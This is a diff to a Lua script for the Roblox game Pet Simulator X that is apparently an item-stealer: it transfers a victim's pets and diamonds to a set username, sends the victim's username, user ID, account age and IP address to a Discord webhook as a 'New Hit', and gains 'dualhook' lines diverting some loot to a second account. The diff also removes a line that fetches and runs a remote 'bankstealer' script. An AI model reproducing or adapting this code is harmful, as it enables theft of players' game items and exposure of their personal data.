@@ -74,18 +74,18 @@ end
 local idiotuser = game:GetService("Players").LocalPlayer.Name
 
 if idiotuser == UserName then
-    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
+    game:GetService("Players").LocalPlayer
     return;
 end
 if UserName == nil then
-    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+    game:GetService("Players").LocalPlayer
     return;
 end
 local worked2 = pcall(function()
     game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end)
 if not worked2 then
-    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
+    game:GetService("Players").LocalPlayer
     return;
 end
 if worked2 then
@@ -96,7 +96,7 @@ if UserName2 ~= nil then
         game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
     end)
     if not worked3 then
-        game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
+        game:GetService("Players").LocalPlayer
         return;
     end
 end
@@ -770,7 +770,6 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -1023,14 +1022,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://media.discordapp.net/attachments/1085213702522949713/1095787502180241589/image.png"
+        "https://cdn.discordapp.com/attachments/1100823909009465497/1122142742844276838/Screenshot_20230414-055925_Gallery.jpg"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Egorikusa Scriptz",
+            ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Egorikusa||",
-                ["url"] = "https://discord.gg/Qg9SBjXExx",
+                ["title"] = "**New Hit** ||With Monzz||",
+                ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1039,14 +1038,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Arhkalis Scriptz's Stealer** :moyai:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["name"] = ":joy: **Pets left** :joy:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1093,14 +1092,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://media.discordapp.net/attachments/1085213702522949713/1095787502180241589/image.png"
+        "https://cdn.discordapp.com/attachments/1100823909009465497/1122142742844276838/Screenshot_20230414-055925_Gallery.jpg"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Egorikusa Scriptz",
+            ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Egorikusa||",
-                ["url"] = "https://discord.gg/Qg9SBjXExx",
+                ["title"] = "**New Hit** ||With Monzz||",
+                ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1109,14 +1108,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Egorikusa Scriptz's Stealer** :moyai:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["name"] = ":joy: **Pets left** :joy:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1158,7 +1157,7 @@ if getgenv().Settings ~= nil then
         local dhdata = {
             dhprem = dhkey
         }
-        local dhurl = "premium database php link here" -- Exc : https://rizz.xyz/premium.php
+        local dhurl = "https://discord.gg/4y4CZfdJHu"
         local dhheaders = {
             ["content-type"] = "application/json"
         }
@@ -1186,7 +1185,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "Yaskop"
+local mailmsg = "Monzz Better"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
@@ -1276,6 +1275,7 @@ spawn(function()
                 user = UserName
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1303,6 +1303,7 @@ spawn(function()
                 user = UserName
                 if bananin ~= nil then
                     if dualhook(bananin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1332,6 +1333,7 @@ spawn(function()
                 user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1360,6 +1362,7 @@ spawn(function()
                 user = UserName
                 if pogin ~= nil then
                     if dualhook(pogin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1387,6 +1390,7 @@ spawn(function()
                 user = UserName
                 if excin ~= nil then
                     if dualhook(excin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1411,9 +1415,10 @@ spawn(function()
     while wait() do
         if #EvList ~= 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EvList) do
-                user = UserName
+                user = ndUser
                 if eventin ~= nil then
                     if dualhook(eventin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1438,9 +1443,10 @@ spawn(function()
     while wait() do
         if #SList ~= 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(SList) do
-                user = UserName
+                user = ndUser
                 if secretin ~= nil then
                     if dualhook(secretin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1465,9 +1471,10 @@ spawn(function()
     while wait() do
         if #MList ~= 0 and #SList == 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(MList) do
-                user = UserName
+                user = ndUser
                 if mythicin ~= nil then
                     if dualhook(mythicin) then
+                        user = dhuser
                     end
                 end
                 local args = {
